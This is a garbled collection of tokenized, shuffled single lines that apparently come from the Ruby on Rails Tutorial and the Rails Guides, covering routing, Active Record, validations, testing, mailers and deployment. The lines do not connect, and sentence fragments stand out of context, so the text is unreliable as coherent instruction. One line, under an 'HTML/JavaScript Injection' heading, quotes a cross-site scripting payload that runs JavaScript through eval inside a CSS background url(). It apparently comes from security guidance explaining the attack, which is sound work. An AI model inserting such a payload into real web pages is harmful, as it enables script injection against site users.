▁These ▁concern s ▁can ▁be ▁used ▁in ▁resources ▁to ▁avoid ▁code ▁duplication ▁and ▁share ▁behavior ▁a cross ▁routes :
▁It ▁defaults ▁to ▁true .
▁$ ▁git ▁pull ▁-- re base
▁* ▁Inde nt ▁after ▁ private / protected .
▁Then ▁fill ▁\ k ode { README ▖ md } ▁with ▁the ▁contents ▁of ▁Listing ~\ ref { code : new _ readme } .
▁# ▁without ▁try
▁You ▁should ╼ instead ▁rely ▁on ▁a ▁data ▁attribute ▁( e ▖ g ▖ ▁` data : ▁ { ▁confirm : ▁' A re ▁you ▁sure ? ' ▁}` ) .
▁At ▁the ▁beginning ▁of ▁this ▁guide , ▁you ╼ will ▁be ▁working ▁so le ly ▁within ▁the ▁engine ▁itself , ▁but ▁in ▁later ▁section s ▁you ' ll ╼ see ▁how ▁to ▁ hook ▁it ▁into ▁an ▁application .
▁Now ▁we ' ll ▁create ▁a ▁second ▁user ▁by ▁re visit ing ▁the ▁\ href { http :// localhost :3000/ users / new }{\ text tt { new } } ▁page ▁and ▁ submitting ▁a ▁second ▁set ▁of ▁user ▁information ; ▁the ▁result ing ▁user ▁\ href { http :// localhost :3000/ users }{\ text tt { index } } ▁is ▁show n ▁in ▁Figure ~\ ref { fig : demo _ user _ index _ two _ rails _3} .
▁# ▁Ruby ▁on ▁Rails ▁Tutorial : ▁sample ▁application
▁d ▖ next _ week (: s at ur day ) ▁# ▁=> ▁S at , ▁ 15 ▁May ▁2010
▁The ▁application ▁code ▁parallel s ▁the ▁addition ▁of ▁the ▁About ▁page ▁in ▁Section ~\ ref { sec : getting _ started _ with _ testing } : ▁first ▁we ▁update ▁the ▁routes ▁( Listing ~\ ref { code : contact _ route }), ▁then ▁we ▁add ▁a ▁\ k ode { contact } ▁action ▁to ▁the ▁Static ▁Pages ▁controller ▁( Listing ~\ ref { code : contact _ action }), ▁and ▁finally ▁we ▁create ▁a ▁Contact ▁view ▁( Listing ~\ ref { code : contact _ view }) .
▁( We ' ll ▁start ▁creating ▁our ▁own ▁controllers ▁in ▁Chapter ~\ ref { cha : a _ toy _ app } ▖)
▁The ▁special ▁syntax ▁`: id ` ▁tell s ▁rails ▁that ▁this ▁route ▁expect s ▁an ▁`: id `╼ param eter , ▁which ▁in ▁our ▁case ▁will ▁be ▁the ▁id ▁of ▁the ▁article .
▁( Note ▁that ▁we ▁have ▁omitted ▁the ▁user ▁\ k ode { self } ▁variable ▁when ever ▁possible ▖)
▁#### ▁Other ▁Time ▁Co m put ation s
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / hash / deep _ merge ▖ rb ` .
▁In ▁Rails ▁applications , ▁\ text tt { POST } ▁requests ▁are ▁typical ly ▁used ▁for ▁\ emph { creating } ▁things ▁( a lthough ▁HTTP ▁also ▁allows ▁\ text tt { POST } ▁to ▁perform ▁update s ) .
▁P ref i x ▁Verb ▁ URI ▁ Pattern ▁Controller # Action
▁WARNING ▖ ▁T a k e ▁into ▁account ▁that ▁` reverse _ merge !` ▁may ▁change ▁the ▁hash ▁in ▁the ▁call er , ▁which ▁may ▁or ▁may ▁not ▁be ▁a ▁good ▁idea .
▁- ▁[ NGINX ]( http :// wiki ▖ n g in x ▖ org / X Sendfile )
▁By ▁default ▁such ▁validations ▁will ▁run ▁every ▁time ▁you ▁call ▁` valid ?` ▖
▁resources ▁: magazine s ▁do
▁As ▁with ▁`` Ctrl - C '' , ▁the ▁convention ▁is ▁to ▁write ▁`` Ctrl - D '' ▁even ▁though ▁it ' s ▁really ▁`` Ctrl - d '' .
▁At ▁this ▁point , ▁all ▁the ▁tests ▁should ▁be ▁\ passing :
▁order _ number : ▁" A 12345 ")
▁It ▁does ▁not ▁create ▁a ▁uniqueness ▁constraint ▁in ▁the ▁database ,╼ so ▁it ▁may ▁happen ▁that ▁two ▁different ▁database ▁connection s ▁create ▁two ▁records ╼ with ▁the ▁same ▁value ▁for ▁a ▁column ▁that ▁you ▁intend ▁to ▁be ▁unique ▖
▁In ▁database ▁terms , ▁this ▁association ▁say s ▁that ▁the ▁other ▁class ▁will ▁have ▁a ▁foreign ▁key ▁that ▁refer s ▁to ▁instance s ▁of ▁this ▁class .
▁For ▁example , ▁in ▁this ▁section ▁we ' ll ▁ensure ▁that ▁both ▁the ▁name ▁and ▁email ▁fields ▁are ▁present ▁before ▁a ▁user ▁get s ▁saved ▁to ▁the ▁database .
▁This ▁write s ▁the ▁path ▁to ▁the ▁particular ▁asset ▁being ▁reference d ▖ ╼╼
▁In ▁the ▁second ▁case , ▁we ▁need ▁to ▁supply ▁an ▁ additional ▁\ k ode { user } ▁hash ▁in ▁order ▁for ▁the ▁routes ▁to ▁work ▁properly .
▁# ▁set ▁to ▁< tt > : create </ tt > ▁if ▁< tt > new _ record ?
▁Here ▁Rails ▁infer s ▁that ▁\ k ode {@ users } ▁is ▁a ▁list ▁of ▁\ k ode { User } ▁objects ; ▁more over , ▁when ▁called ▁with ▁a ▁collection ▁of ▁users , ▁Rails ▁automatically ▁iterate s ▁through ▁them ▁and ▁render s ▁each ▁one ▁with ▁the ▁\ k ode { \_ user ▖ html ▖ erb } ▁partial .
▁appears ▁as ▁follows :
▁This ▁application ▁includes ▁examples ▁of ▁all ▁the ▁major ▁features ▁of ▁Rails , ▁including ▁models , ▁views , ▁controllers , ▁templates , ▁partials , ▁filter s , ▁validations , ▁callbacks , ▁\ k ode { has \_ many } / \ k ode { belongs \_ to } ▁and ▁\ k ode { has \_ many ▁: through } ▁associations , ▁security , ▁testing , ▁and ▁deployment .
▁Note ▁that ▁Listing ~\ ref { code : real _ account _ activation _ test } ▁take s ▁care ▁to ▁add ▁an ▁activation ▁token ▁to ▁the ▁fixture ▁user , ▁which ▁would ▁otherwise ▁be ▁blank .
▁Testing ▁the ▁feed ▁HTML ▖
▁Then ▁we ' ll ▁write ▁a ▁simple ▁test ▁of ▁an ▁ unsuccessful ▁edit , ▁as ▁show n ▁in ▁Listing ~\ ref { code : unsuccessful _ edit _ test } .
▁At ▁present , ▁new ly ▁registered ▁users ▁immediately ▁have ▁full ▁access ▁to ▁their ▁account s ▁( Chapter ~\ ref { cha : sign _ up }) .
▁# ▁=> ▁< field set >< p >< input ▁id =" name " ▁name =" name " ▁type =" text " ▁ / ></ p ></ field set >
▁There ▁are ▁three ▁main ▁elements : ▁an ▁ en h ance d ▁pass / fa i l ▁report er ▁( Section ~\ ref { sec : minitest _ reporters }), ▁a ▁ utility ▁to ▁filter ▁the ▁ backtrace ▁produce d ▁by ▁failing ▁tests ▁( Section ~\ ref { sec : backtrace _ silencer }), ▁and ▁an ▁automate d ▁test ▁run n er ▁that ▁ de t ec t s ▁file ▁changes ▁and ▁automatically ▁run s ▁the ▁corresponding ▁tests ▁( Section ~\ ref { sec : guard }) .
▁create ▁app / assets / stylesheets / static _ pages ▖ css ▖ scss
▁--------- ---------------
▁For ▁simple ▁fix es , ▁the ▁easie st ▁way ▁to ▁back port ▁your ▁changes ▁is ▁to ▁[ extract ▁a ▁d if f ▁from ▁your ▁changes ▁in ▁master ▁and ▁apply ▁them ▁to ▁the ▁ target ▁branch ]( http :// a ri e ja n ▖ net / 200 9 / 10 / 2 6 / how - to - create - and - app ly - a - patch - with - git ) .
▁The ▁\ emph { Rails ▁Tutorial } ▁contains ▁in te gr at ed ▁tutorial s ▁not ▁only ▁for ▁Rails , ▁but ▁also ▁for ▁the ▁under ly ing ▁Ruby ▁language , ▁the ▁RSpec ▁testing ▁framework , ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / HTML } { HTML }, ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / CSS } { CSS }, ▁a ▁small ▁amount ▁of ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / JavaScript } { JavaScript }, ▁and ▁even ▁a ▁little ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / SQL } { SQL } ▖ ▁This ▁means ▁that , ▁no ▁matter ▁where ▁you ▁current ly ▁are ▁in ▁your ▁ knowledg e ▁of ▁web ▁development , ▁by ▁the ▁time ▁you ▁finish ▁this ▁tutorial ▁you ▁will ▁be ▁ready ▁for ▁more ▁advanced ▁Rails ▁resources , ▁as ▁well ▁as ▁for ▁the ▁more ▁system at ic ▁treat ment s ▁of ▁the ▁other ▁subject s ▁mentioned .
▁The ▁URL ▁ / users /1 ▁with ▁routing ▁but ▁no ▁page .
▁S ince ▁each ▁user ▁should ▁have ▁a ▁feed , ▁we ▁are ▁ le d ▁natural ly ▁to ▁a ▁\ k ode { feed } ▁method ▁in ▁the ▁User ▁model , ▁which ▁will ▁initially ▁just ▁select ▁all ▁the ▁microposts ▁ belonging ▁to ▁the ▁current ▁user .
▁This ▁means ▁anything ▁that ▁ compile s ▁to ╼ JS / CSS ▁is ▁ exclude d , ▁as ▁well ▁as ▁raw ▁ JS / CSS ▁files ; ▁for ▁example , ▁` ▖ coffee ` ▁and ╼` ▖ scss ` ▁files ▁are ▁** not ** ▁automatically ▁included ▁as ▁they ▁ compile ▁to ▁ JS / CSS .
▁$ ▁rails ▁new ▁blog
▁<%= ▁field _ set _ tag ▁do ▁%>
▁This ▁optional ▁section ▁describe s ▁the ▁testing ▁setup ▁used ▁in ▁the ▁\ href { http :// screencasts ▖ railstutorial ▖ org /}{ Ruby ▁on ▁Rails ▁Tutorial ▁ screen c a st ▁series } .
▁Configur ing ▁Rails ▁to ▁use ▁ SendGrid ▁in ▁production .
▁in ▁Listing ~\ ref { code : about _ view } .
▁No ▁real ▁understanding
▁The ▁form ▁will ▁be ▁making ▁a ▁` POST ` ▁request ▁to ▁` / articles / : article _ id / comments `, ▁which ╼ will ▁correspond ▁with ▁the ▁` create ` ▁action ▁in ▁` Blorgh :: Comments Controller ` ▖
▁This ▁provides ▁remote ▁back up s ▁and ▁let s ▁you ▁catch ▁any ▁production ▁errors ▁as ▁soon ▁as ▁possible .
▁#### ▁HTML / JavaScript ▁Injection
▁The ▁correspond ence ▁between ▁pages ▁and ▁URLs ▁for ▁the ▁Users ▁resource .
▁For ▁example , ▁when ▁you ▁are n ' t ▁at ▁all ▁sure ▁how ▁to ▁solve ▁a ▁given ▁programming ▁problem , ▁it ' s ▁often ▁useful ▁to ▁skip ▁the ▁tests ▁and ▁write ▁only ▁application ▁code , ▁just ▁to ▁get ▁a ▁sense ▁of ▁what ▁the ▁solution ▁will ▁look ▁like .
▁With ▁these ▁changes , ▁Active ▁Record ▁will ▁only ▁load ▁one ▁copy ▁of ▁the ▁customer ▁object , ▁ preventing ▁in con s ist en c ies ▁and ▁making ▁your ▁application ▁more ▁ efficient :
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : follow _ unfollow _ following }, ▁the ▁tests ▁should ▁be ▁\ passing :
▁We ' ll ▁put ▁the ▁result ing ▁\ k ode { find } ▁inside ▁a ▁\ k ode { correct \_ user } ▁before ▁filter , ▁which ▁check s ▁that ▁the ▁current ▁user ▁actually ▁has ▁a ▁micropost ▁with ▁the ▁given ▁id .
▁S ince ▁each ▁user ▁should ▁have ▁a ▁feed , ▁we ▁are ▁ le d ▁natural ly ▁to ▁a ▁\ k ode { feed } ▁method ▁in ▁the ▁User ▁model .
▁The ▁problem ▁is ▁that ▁by ▁default ▁( as ▁of ▁Rails ~ 3▖2 ▖ 3 ) ▁\ emph { all } ▁of ▁the ▁attributes ▁for ▁our ▁Micropost ▁model ▁are ▁ accessible .
▁The ▁syntax ▁for ▁this ▁kind ▁of ▁object , ▁called ▁a ▁\ emph { Proc } ▁( procedure ) ▁or ▁\ emph { lambda }, ▁is ▁the ▁ ar row ~\ k ode { - > } .
▁A ▁test ▁for ▁the ▁new ▁user ▁page ▖
▁Using ▁Action ▁View ▁with ▁Rails
▁You ▁can ▁use ▁a ▁symbol ▁to ▁def er ▁the ▁choice ▁of ▁layout ▁un til ▁a ▁request ▁is ▁processed :
▁More over , ▁ persistent ▁sessions ▁are ▁cumbersome ▁to ▁check ▁by ▁hand , ▁so ▁if ▁we ▁ever ▁want ▁to ▁refactor ▁the ▁\ k ode { current \_ user } ▁method ▁( as ▁we ▁will ▁in ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ resets }) ▁it ' s ▁important ▁to ▁test ▁it .
▁To ▁send ▁email ▁in ▁production , ▁we ' ll ▁use ▁ SendGrid , ▁which ▁is ▁available ▁as ▁an ▁add - on ▁at ▁Heroku ▁for ▁verifie d ▁account s .
▁### ▁ Mo un ting ▁the ▁ Engine
▁validates ▁: password , ▁confirmation : ▁true ,
▁It ' s ▁possible ▁to ▁constrain ▁the ▁\ emph { display } ▁size ▁with ▁CSS , ▁but ▁this ▁doesn ' t ▁change ▁the ▁image ▁size .
▁ Custom ▁HTML ▁for ▁the ▁Help ▁page .
▁ //= ▁require ▁ bootstrap
▁There ▁are ▁sever al ▁methods ▁that ▁you ▁can ▁use ▁to ▁check ▁your ╼ models ▁and ▁validate ▁that ▁an ▁attribute ▁value ▁is ▁not ▁empty , ▁is ▁unique ▁and ▁not ╼ already ▁in ▁the ▁database , ▁follows ▁a ▁specific ▁format ▁and ▁many ▁more .
▁This ▁file ▁will ▁provide ▁any ╼ common ▁functionality ▁for ▁the ▁controllers ▁of ▁the ▁engine ▖
▁def ▁update _ name
▁m ▖ reachable ?
▁### ▁Route ▁G lo b b ing ▁and ▁Wi ld card ▁S eg ment s
▁Client ▖ order (: orders _ count , ▁created _ at : ▁: desc )
▁Active ▁Record ▁facilit ate s ▁the ▁creation ▁and ▁use ▁of ▁ business ╼ objects ▁who se ▁data ▁requires ▁ persistent ▁ storage ▁to ▁a ▁database ▖
▁We ▁first ▁saw ▁microposts ▁in ▁ l ar val ▁form ▁in ▁Chapter ~\ ref { cha : a _ demo _ app }, ▁and ▁in ▁this ▁chapter ▁we ▁will ▁make ▁a ▁full - strength ▁version ▁of ▁the ▁ sketch ▁from ▁Section ~\ ref { sec : microposts _ resource } ▁by ▁construct ing ▁the ▁Micropost ▁data ▁model , ▁associat ing ▁it ▁with ▁the ▁User ▁model ▁using ▁the ▁\ k ode { has \_ many } ▁and ▁\ k ode { belongs \_ to } ▁methods , ▁and ▁then ▁making ▁the ▁forms ▁and ▁partials ▁needed ▁to ▁manipulate ▁and ▁display ▁the ▁results ▁( including , ▁in ▁Section ~\ ref { sec : microposts _ with _ images }, ▁upload ed ▁images ) .
▁Active ▁Record ▁let s ▁you ▁use ▁the ▁names ▁of ▁the ▁[ associations ]( association _ basic s ▖ html ) ▁defined ▁on ▁the ▁model ▁as ▁a ▁shortcut ▁for ▁specify ing ▁` JOIN ` ▁clause s ▁for ▁those ▁associations ▁when ▁using ▁the ▁` joins ` ▁method .
▁The ▁data ▁model ▁for ▁microposts .
▁The ▁elements ▁of ▁logging ▁in ▁and ▁out ▁correspond ▁to ▁particular ▁REST ▁actions ▁of ▁the ▁Sessions ▁controller : ▁the ▁login ▁form ▁is ▁handle d ▁by ▁the ▁\ k ode { new } ▁action ▁( c over ed ▁in ▁this ▁section ), ▁actually ▁logging ▁in ▁is ▁handle d ▁by ▁sending ▁a ▁\ text tt { POST } ▁request ▁to ▁the ▁\ k ode { create } ▁action ▁( Section ~\ ref { sec : logging _ in }), ▁and ▁logging ▁out ▁is ▁handle d ▁by ▁sending ▁a ▁\ text tt { DELETE } ▁request ▁to ▁the ▁\ k ode { destroy } ▁action ▁( Section ~\ ref { sec : logging _ out }) .
▁The ▁Rails ▁way ▁to ▁display ▁a ▁temporary ▁message ▁is ▁to ▁use ▁a ▁special ▁method ▁called ▁the ▁\ emph { flash }, ▁which ▁we ▁can ▁treat ▁like ▁a ▁hash .
▁Note ▁that ▁\ k ode { git ▁ checkout ▁- b ▁modify - README } ▁both ▁creates ▁a ▁new ▁branch ▁and ▁switch es ▁to ▁it , ▁as ▁indicate d ▁by ▁the ▁as ter is k ▁in ▁front ▁of ▁the ▁\ k ode { modify - README } ▁branch .
▁In ▁Chapter ~\ ref { cha : filling _ in _ the _ layout }, ▁we ' ll ▁start ▁ putting ▁it ▁to ▁good ▁use ▁in ▁developing ▁the ▁sample ▁application .
▁The ▁Home ▁page ▁with ▁status ▁feed ▁and ▁ increment ed ▁following ▁count ▖ ~\ href { http :// railstutorial ▖ org / images / figures / page _ flow _ home _ page _ feed _ mockup _ bootstrap - full ▖ png }{( full ▁size )}
▁1 3 ▖ to _ s (: rounded , ▁ precision : ▁5 ) ▁# ▁=> ▁1 3▖0 0 000
▁You ▁should ▁use ▁this ▁helper ▁when ▁you ▁have ▁two ▁text ▁fields ▁that ▁should ▁receive ╼ exactly ▁the ▁same ▁content ▖
▁This ▁does ▁not ▁work ▁in ▁con j un c tion ▁with ▁the ▁` as : ▁: value ` ▁option .
▁<%= ▁javascript _ include _ tag ▁" application " ▁%>
▁This ▁prevent s ▁our ▁code ▁from ▁ activating ▁users ▁who ▁have ▁already ▁been ▁ activated , ▁which ▁is ▁important ▁because ▁we ' ll ▁be ▁logging ▁in ▁users ▁upon ▁confirmation , ▁and ▁we ▁don ' t ▁want ▁to ▁allow ▁attacker s ▁who ▁manage ▁to ▁obtain ▁the ▁activation ▁link ▁to ▁log ▁in ▁as ▁the ▁user .
▁# ▁updated _ at ▁: datetime
▁@ articles ▁= ▁Article ▖ all
▁It ' s ▁time ▁to ▁learn ▁how ▁to ▁use ▁Active ▁Record ▁to ▁find ▁user ▁objects .
▁[ A ▁powerful ▁ mechanism ▁for ▁control l ing ▁which ▁site s ▁certain ▁content ▁types ▁can ▁be ▁loaded ▁from ]( http :// w 3 c ▖ github ▖ io / web app sec / spec s / content - security - p ol ic y / c s p - specific ation ▖ dev ▖ html )
▁current _ user ▖ increment ! ▁: visit s
▁Micropost ▁fixtures ▁with ▁user ▁associations .
▁* ▁` ENV [" RAILS _ ENV "] ` ▁defines ▁the ▁Rails ▁environment ▁( production , ▁development , ▁test , ▁and ▁so ▁on ) ▁that ▁Rails ▁will ▁run ▁under .
▁Instead ▁you ▁will ▁need ▁to ▁use ▁the ▁ associated ▁` * _ url ` ▁helper ▖
▁as ▁seen ▁in ▁Listing ~\ ref { code : application _ layout _ full _ title } .
▁This ▁example ▁ assumes ▁you ▁are ▁using ▁Ruby ~ 1▖9▖3 ▁or ▁later .
▁to ▁ensure ▁that ▁you ▁have ▁the ▁latest ▁version ▖)
▁create _ table ▁: assemblies ▁do ▁| t |
▁But ▁it ▁could ▁be ▁the ▁case ▁that ▁` articles _ helper ▖ rb ` ▁raise s ▁a ▁` NameError ` ▁due ▁to ▁an ▁actual ▁ unknown ▁constant ▖
▁#### ▁` to _ sentence `
▁ hello _ world
▁P utting ▁these ▁together , ▁the ▁test ▁look s ▁for ▁an ▁element ▁of ▁the ▁following ▁form :
▁in ▁Listing ~\ ref { code : hello _ action _ redux _ 2 } ▁and
▁TIP : ▁ _ If ▁you ▁need ▁to ▁use ▁a ▁different ▁controller ▁ namespace ▁inside ▁a ▁` namespace ` ▁block ▁you ▁can ▁specify ▁an ▁ absolute ▁controller ▁path , ▁e ▖ g : ▁` get ▁' / foo ' ▁=> ▁' / foo # index ' ` ▖ _
▁If ▁you ▁choose ▁to ▁use ▁PostgreSQL ▁and ▁are ▁using ▁JRuby , ▁your ▁` config / database ▖ yml ` ▁will ▁look ▁a ▁little ▁different ▖
▁P o ly m or ph ic ▁associations ▁were ▁discuss ed ▁in ▁detail ▁< a ▁ href ="# polymorphic - associations "> e ar li er ▁in ▁this ▁guide </ a > .
▁This ▁process ▁was ▁pa in ful ▁and ▁error - prone .
▁#### ▁` assert _ valid _ keys `
▁NOTE : ▁There ▁are ▁` public `, ▁` private ` ▁and ▁` protected ` ▁methods ▁in ▁Ruby ,╼ but ▁only ▁` public ` ▁methods ▁can ▁be ▁actions ▁for ▁controllers ▖╼
▁If ▁you ' re ▁running ▁ Linux , ▁you ▁m ight ▁have ▁to ▁install ▁a ▁couple ▁of ▁other ▁package s ▁at ▁this ▁point :
▁We ▁pass ▁` id : ▁false ` ▁to ▁` create _ table ` ▁because ▁that ▁table ▁does ▁not ▁represent ▁a ▁model ▖
▁To ▁get ▁an ▁up - to - date ▁list ▁of ▁the ▁adapter s ╼ see ▁the ▁API ▁Documentation ▁for ▁[ ActiveJob :: Q ue ue Adapters ]( http :// api ▖ rubyonrails ▖ org / classes / ActiveJob / Q ue ue Adapters ▖ html ) .
▁( A ll ▁the ▁examples ▁in ▁this ▁book ▁will ▁use ▁the ▁\ k ode { - m } ▁flag ▖)
▁will ▁recognize ▁in com ing ▁paths ▁beginning ▁with ▁` / photos ` ▁and ▁route ▁the ▁requests ▁to ▁` PhotosController `, ▁but ▁use ▁the ▁value ▁of ▁the ▁: as ▁option ▁to ▁name ▁the ▁helpers .
▁ Flash ▁message ▁keys ▁are ╼[ normal ize d ▁to ▁strings ]( https :// github ▖ com / rails / rails / commit / a 6 6 8 be f fd 64 1 06 a 1 e 1 fe db 7 1 cc 25 ea a a 11 b a f 0 c 1 )▖ ▁They ╼ can ▁ still ▁be ▁access ed ▁using ▁either ▁symbols ▁or ▁strings ▖
▁We ' ll ▁fix ▁the ▁first ▁issue ▁in ▁Section ~\ ref { sec : signup _ error _ messages } ▁and ▁the ▁second ▁in ▁Section ~\ ref { sec : signup _ success } .
▁By ▁default , ▁associations ▁look ▁for ▁objects ▁only ▁within ▁the ▁current ▁module ' s ▁scope ▖
▁ Refactor ▁the ▁signin ▁form ▁to ▁use ▁\ k ode { form \_ tag } ▁in ▁place ▁of ▁\ k ode { form \_ for } .
▁ inflect ▖ ir regular ▁' to oth ', ▁' te e th '
▁The ▁difficult y ▁of ▁a ▁back port ▁var ies ▁great ly ▁from ▁case ▁to ▁case , ▁and ▁some times ▁it ▁is ▁simply ▁not ▁worth ▁the ▁effort .
▁in ▁Listing ~\ ref { code : activation _ token _ test } .
▁So , ▁we ▁see ▁now ▁that ▁the ▁line
▁ Make ▁sure ▁the ▁test ▁suite ▁ still ▁passes .
▁We ▁often ▁need ▁to ▁iterate ▁over ▁a ▁large ▁set ▁of ▁records , ▁as ▁when ▁we ▁send ▁a ▁new s let ter ▁to ▁a ▁large ▁set ▁of ▁users , ▁or ▁when ▁we ▁ ex port ▁data .
▁In ▁the ▁next ▁chapter , ▁Chapter ~\ ref { cha : sign _ up }, ▁we ' ll ▁make ▁a ▁working ▁signup ▁form ▁to ▁create ▁new ▁users , ▁together ▁with ▁a ▁page ▁to ▁display ▁each ▁user ' s ▁information .
▁The ▁difference ╼ is ▁the ▁line ▁` belongs _ to ▁: article `, ▁which ▁set s ▁up ▁an ▁Active ▁Record ▁ _ association _ ▖╼
▁```
▁At ▁this ▁point , ▁the ▁tests ▁should ▁pass :
▁To ▁ prepare ▁the ▁system ▁for ▁deployment ▁to ▁production , ▁we ▁run ▁\ k ode { bundle ▁install } ▁with ▁a ▁special ▁flag ▁to ▁prevent ▁the ▁local ▁installation ▁of ▁any ▁production ▁gems ▁( which ▁in ▁this ▁case ▁consist s ▁of ~\ text tt { pg } ▁and ▁\ text tt { rails \_ 12 factor }) :
▁as ▁show n ▁in ▁Listing ~\ ref { code : branch _ raise } .
▁See ▁the ▁[ E rubi s ▁documentation ]( http :// www ▖ k u w at a - lab ▖ com / e rubi s / users - guid e ▖ 06 ▖ html # to p ic s - tr im space s ) ▁for ▁more ▁information .
▁At ▁this ▁point , ▁the ▁full ▁test ▁suite ▁should ▁be ▁\ passing :
▁# ▁or
▁### ▁Using ▁` redirect _ to `
▁P re tt i er ▁tests ▁for ▁the ▁static ▁pages .
▁Support ed ╼ language s ▁include ▁Sass ▁for ▁CSS , ▁CoffeeScript ▁for ▁JavaScript , ▁and ▁ ERB ▁for ▁both ▁by ╼ default .
▁Because ▁it ▁would ▁be ▁ st range ▁to ▁ force ▁users ▁to ▁log ▁in ▁immediately ▁after ▁ signing ▁up , ▁we ' ll ▁log ▁in ▁new ▁users ▁automatically ▁as ▁part ▁of ▁the ▁signup ▁process .
▁belongs _ to ▁: article
▁will ▁also ▁match ▁the ▁full ▁title .
▁### ▁ Control l ing ▁Association ▁S co pe
▁" hello "▖ from ( - 2 ) ▁# ▁=> ▁" lo "
▁style =" background : url (' javascript : eval ( document ▖ all ▖ my code ▖ ex p r ) ') ">
▁record ▖ errors [ attribute ] ▁<< ▁( options [: message ] ▁|| ▁" is ▁not ▁an ▁email ")
▁from ▁Listing ~\ ref { code : hello _ root _ route } ▁to
▁beginning _ of _ year ▁( at _ beginning _ of _ year )
▁You ▁can ▁also ▁use ▁` url _ for ` ▁with ▁a ▁set ▁of ▁objects , ▁and ▁Rails ▁will ▁automatically ▁determine ▁which ▁route ▁you ▁want :
▁in ▁Listing ~\ ref { code : micropost _ ordering _ test } .
▁| ▁POST ▁| ▁ / geocoder ▁| ▁ geocoder s # create ▁| ▁create ▁the ▁new ▁ geocoder ▁|
▁ ╼ ▁$ ▁bundle ▁exec ▁rake ▁- T ▁db
▁Configur ing ▁Rails ▁Co mp on ent s
▁You ▁can ▁now ▁create , ▁show , ▁and ▁list ▁articles ▖
▁# ▁ Turbolinks ▁make s ▁following ▁links ▁in ▁your ▁web ▁application ▁faster .
▁The ▁second ▁case , ▁in v ol v ing ▁a ▁scenario ▁with ▁two ▁different ▁browsers , ▁is ▁hard er ▁to ▁simul ate ▁with ▁an ▁integration ▁test , ▁but ▁it ' s ▁easy ▁to ▁check ▁in ▁the ▁User ▁model ▁test ▁directly .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / array / wrap ▖ rb ` .
▁NOTE ▖ ▁A l way s ▁specify ▁an ▁expected ▁ compiled ▁filename ▁that ▁end s ▁with ▁ ▖ js ▁or ▁ ▖ css ,╼ even ▁if ▁you ▁want ▁to ▁add ▁Sass ▁or ▁CoffeeScript ▁files ▁to ▁the ▁ precompile ▁array .
▁I ▁think ▁of ▁Chapter ▁1 ▁as ▁the ▁`` we ed ing ▁out ▁p has e '' ▁in ▁ la w ▁ school --- if ▁you ▁can ▁get ▁your ▁ dev ▁environment ▁set ▁up , ▁the ▁rest ▁is ▁easy ▁to ▁get ▁through .
▁The ▁result ing ▁toy ▁app ▁will ▁allow ▁us ▁to ▁interact ▁with ▁it ▁through ▁its ▁URLs , ▁giv ing ▁us ▁in s ight ▁into ▁the ▁structure ▁of ▁a ▁Rails ▁application , ▁including ▁a ▁first ▁example ▁of ▁the ▁\ emph { REST ▁architecture } ▁favor ed ▁by ▁Rails .
▁Instead , ▁it ▁as k s ▁the ▁database ▁to ▁count ▁the ▁microposts ▁with ▁the ▁given ▁\ k ode { user \_ id } .
▁Do c rails ▁is ▁merge d ▁with ▁master ▁regular ly , ▁so ▁you ▁are ▁effective ly ▁edit ing ▁the ▁Ruby ▁on ▁Rails ▁documentation .
▁This ▁also ▁applies ▁to ▁your ▁i 18 n ╼ ▁ tr an s l ation ▁files ▖
▁gem ▁' jquery - rails '
▁The ▁`: shallow _ prefix ` ▁option ▁add s ▁the ▁specified ▁parameter ▁to ▁the ▁named ▁helpers :
▁( Here ▁we ▁have ▁re name d ▁the ▁second ▁argument ▁\ k ode { token } ▁to ▁emphasize ▁that ▁it ' s ▁now ▁generic ▖)
▁Now ▁we ▁have ▁to ▁d ec ide ▁what ▁to ▁use ▁as ▁a ▁remember ▁token .
▁ Base d ▁on ▁this ▁pattern , ▁you ▁may ▁be ▁able ▁to ▁guess ▁how ▁to ▁run ▁\ emph { all } ▁the ▁ spec s :
▁You ▁can ▁also ▁pass ▁raw ▁SQL ▁to ▁the ▁` lock ` ▁method ▁for ▁allow ing ▁different ▁types ▁of ▁ lock s ▖
▁We ▁will ▁also ▁make ▁views ▁to ▁display ▁both ▁a ▁user ' s ▁followers ▁and ▁the ▁users ▁each ▁user ▁is ▁following .
▁debug ( my _ hash )
▁We ' ll ▁then ▁complete ▁user ▁login ▁in ▁Section ~\ ref { sec : logging _ in } ▁by ▁adding ▁the ▁necessary ▁session - manipulati on ▁code .
▁The ▁Static ▁Pages ▁controller ▁test ▁with ▁a ▁base ▁title ▖
▁By ▁using ▁a ▁simple ▁HTML ▁property ▁instead ▁of ▁insert ing ▁the ▁full ▁JavaScript ▁code ▁( as ▁in ▁previous ▁versions ▁of ▁Rails ), ▁Rails ▁follows ▁the ▁p hi lo so ph y ▁of ▁\ href { http :// r ailscasts ▖ com / episodes / 20 5 - u nobtrusive - javascript }{\ emph { u nobtrusive ▁JavaScript } } .
▁We ▁ en counter ed ▁this ▁idea ▁brief ly ▁in ▁the ▁context ▁of ▁\ k ode { reverse } ▁in ▁the ▁\ k ode { palindrome } ▁method ▁( Section ~\ ref { sec : a _ class _ of _ our _ own }), ▁which ▁also ▁noted ▁that ▁\ k ode { self } ▁is ▁\ emph { not } ▁optional ▁in ▁an ▁assignment , ▁so
▁User Mailer ▖ week ly _ summary ( user )▖ deliver _ now
▁$ ▁rake ▁test
▁In ▁this ▁case , ▁for ▁example , ▁the ▁application ▁would ▁recognize ▁paths ▁such ▁as :
▁To ▁get ▁the ▁layout ▁to ▁work , ▁we ▁have ▁to ▁replace ▁the ▁default ▁title ▁with ▁the ▁ Embedded ▁Ruby ▁from ▁the ▁examples ▁above :
▁In ▁this ▁context , ▁\ emph { hashed ▁password } ▁and ▁\ emph { password ▁digest } ▁are ▁ sy n on y m s ▖)
▁In ▁fact , ▁you ▁can ▁even ▁create ▁a ▁he ter o ge ne ous ▁collection ▁and ▁render ▁it ▁this ▁way , ▁and ▁Rails ▁will ▁choose ▁the ▁proper ▁partial ▁for ▁each ▁ member ▁of ▁the ▁collection :
▁has _ many ▁: comments
▁ Adding ▁CSS ▁for ▁some ▁ universal ▁styling ▁apply ing ▁to ▁all ▁pages .
